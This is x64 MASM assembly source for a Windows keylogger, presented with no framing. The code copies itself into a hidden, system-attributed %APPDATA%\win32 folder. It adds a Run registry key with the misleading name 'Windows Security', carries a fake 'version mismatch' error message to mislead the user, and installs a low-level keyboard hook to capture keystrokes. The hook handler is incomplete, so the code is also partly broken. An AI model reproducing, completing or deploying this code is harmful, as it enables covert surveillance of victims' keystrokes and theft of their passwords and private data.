
includelib \masm64\lib\kernel32.lib
includelib \masm64\lib\user32.lib
includelib \masm64\lib\advapi32.lib
includelib \masm64\lib\wininet.lib
extern MessageBoxA : proc
extern ExitProcess : proc
extern GetModuleFileNameA : proc
extern GetEnvironmentVariableA : proc
extern CreateDirectoryA : proc
extern SetFileAttributesA : proc
extern CopyFileA : proc
extern RegOpenKeyExA : proc
extern RegSetValueExA : proc
extern SetWindowsHookExA : proc
extern GetKeyboardState : proc
extern SetKeyboardState : proc
extern GetKeyState :proc
extern GetForegroundWindow : proc
extern GetMessageA : proc
extern GetAsyncKeyState : proc
extern GetSystemTime : proc
extern GetKeyNameTextA : proc
extern CallNextHookEx : proc
WriteConsoleA PROTO
GetStdHandle PROTO


FILE_ATTRIBUTE_HIDDEN equ 2h
FILE_ATTRIBUTE_SYSTEM equ 4h
HKEY_CURRENT_USER equ 80000001h
KEY_SET_VALUE  equ 2h
REG_SZ	equ 1
WH_KEYBOARD equ 2

WH_KEYBOARD_LL equ 13
WM_KEYUP equ 101h
WM_SYSKEYUP equ 105h
VK_CAPITAL equ 14h
VK_LSHIFT equ 0a0h
VK_RSHIFT equ 0a1h
VK_BACK equ 8h
VK_ESCAPE equ 1bh
VK_RETURN equ 0dh
VK_TAB equ 9h
VK_SHIFT equ 10h

.data
	msg				db	'This Software version is too old for this Microsoft Operaiting system ',10,' Please use a more recent version of this The Software',0
	msgtitle		db	'Windows version mismatch',0
	lpFilePath		db	300h dup(?)
	lpFilePathlen	db	0
	lpFilename		db	100h dup(?)
	lpFilenamelen	db	0
	lpAppdata		db	'Appdata',0
	lpTargetpath	db	300h dup(?)
	lpTargetpathlen	db	0
	lpAppdatapath	db	300h dup(?)
	lpFoldername	db	'\win32',0
	lpSubkey		db	'Software\Microsoft\Windows\CurrentVersion\Run', 0
	phkResult		db	8h dup(0)
	lpValueName		db	'Windows Security',0
	keyb			db	600h dup(?)
	lpmas			db	'C:\Users\Yigit\Desktop\mssfeaak',0, 400h dup(0)
	sepkey			db	10h dup (0)
	n				BYTE 10,0,0,0,0,0,0
	h				BYTE 0,0
	bytesWritten    DWORD ?

.code

print proc
	
    mov rcx, -11                ; nStdHandle (STD_OUTPUT_HANDLE)
    call GetStdHandle
	mov  rcx, rax  
    mov  r8, 2h   
    lea  r9, bytesWritten      
    mov  QWORD PTR [rsp + 4 * SIZEOF QWORD], 0 
    call WriteConsoleA

    mov rcx, -11                
    call GetStdHandle
	mov  rcx, rax               
    lea  rdx, n             
    mov  r8, 2h   
    lea  r9, bytesWritten      
    mov  QWORD PTR [rsp + 4 * SIZEOF QWORD], 0  
    call WriteConsoleA

	ret
print endp

LowLevelKeyboardProc proc nCode:dword, wParam:dword, lParam:qword

 
	lea rdx, wParam
	lea rcx, lParam
	mov rdx, r8
	call print

  sub rsp, 20h
  xor ecx, ecx
  call CallNextHookEx
  add rsp, 20h
	ret

LowLevelKeyboardProc endp

start		proc
	sub		rsp, 28h
	


;------------------------------------
	
	xor rcx, rcx
	lea rdx, lpFilePath
	mov r8, 300h; maxlen of filedir
	call GetModuleFileNameA  ; rax len of lpFilepath
	lea r8, lpFilePathlen
	mov [r8], al

	lea rdx, lpFilepath	; write filename to lpFilename
	add rdx, rax
	mov r8b, '\'
	xor rcx,rcx
l1:	dec rdx
	inc rcx
	cmp byte ptr[rdx], r8b
	jne l1
	lea r9, lpFilenamelen
	mov [r9], al
	lea r8, lpFilename
l2:	mov al, byte ptr[rdx]
	mov [r8], al
	inc rdx
	inc r8
	cmp byte ptr[rdx], 0
	jne l2

	lea rcx, lpAppdata
	lea rdx, lpTargetpath
	mov r8, 300h
	call GetEnvironmentVariableA

	lea rcx, lpTargetpath
	lea rdx, lpAppdatapath
l8:	mov al, byte ptr[rcx]
	mov [rdx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l8

	lea rdx, lpFoldername
	dec rcx
l6:
	mov al, byte ptr[rdx]
	mov [rcx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l6
	dec rcx

	lea rdx, lpFilename
l3:
	mov al, byte ptr[rdx]
	mov [rcx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l3

	lea rcx, lpTargetpath
	lea rdx, lpFilePath
l5:	mov al, byte ptr[rdx]
	mov bl, byte ptr[rcx]
	cmp al, 0
	je l60
	inc rdx
	inc rcx
	cmp al, bl
	jne l4
	jmp l5

l4:

	
;------------------------------------

; This will work when u are not in appdata\win32

	lea rdx, lpAppdatapath
l10:
	inc rdx
	mov al, byte ptr[rdx]
	cmp al,0
	jne l10

	lea rcx, lpFoldername
l9:	mov al, byte ptr[rcx]
	mov [rdx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l9
	
	lea rcx, lpAppdatapath
	xor rdx, rdx
	call CreateDirectoryA 

	lea rcx, lpAppdatapath
	mov rdx, FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN
	call SetFileAttributesA 

	lea rcx, lpFilepath
	lea rdx, lpTargetpath
	xor r8, r8
	call CopyFileA

	lea rcx, lpTargetpath
	mov rdx, FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN
	call SetFileAttributesA 


	mov rcx, HKEY_CURRENT_USER 
	lea rdx, lpSubkey
	xor r8, r8
	mov r9, KEY_SET_VALUE
	lea r10, phkResult
	mov qword ptr [rsp+20h], r10
	call RegOpenKeyExA	

	lea rdx, lpTargetpath ;get lpTargetpathlen
	xor rcx, rcx
l12:	
	mov al, [rdx]
	inc rcx
	inc rdx
	cmp al, 0
	jne l12
	lea rdx, lpTargetpathlen
	mov [rdx], cx

	

	mov r13b, lpTargetpathlen
	push r13
    lea r13, lpTargetpath
    push r13
	sub rsp, 20h

    mov r9d, REG_SZ
    lea rdx, lpValueName
	lea r8, phkResult
	mov ecx, dword ptr[phkResult]
	xor r8, r8
    call RegSetValueExA

	jmp l60

		;Error messagebox
	xor		r9d, r9d
	add r9d, 10h
	lea		r8, msgtitle
	lea		rdx, msg
	xor		ecx, ecx
	call	MessageBoxA
l60:

;------------------------------------

; There will run after file copied to appdata\win32 and get hidden


	mov r13, 40
  xor r9d, r9d
  xor r8d, r8d                                            ; mov r8d, eax
  lea rdx, LowLevelKeyboardProc
  xor ecx, ecx
  mov cl, WH_KEYBOARD_LL
  call SetWindowsHookExA


  xor r9d, r9d
  xor r8d, r8d
  xor edx, edx
  lea rcx, keyb                                            ;WARNING MSG in rbx
  call GetMessageA
  

exit:
  xor ecx, ecx
  call ExitProcess

;------------------------------------
	

	
	xor		rcx, rcx
	call	ExitProcess 
start	endp
end


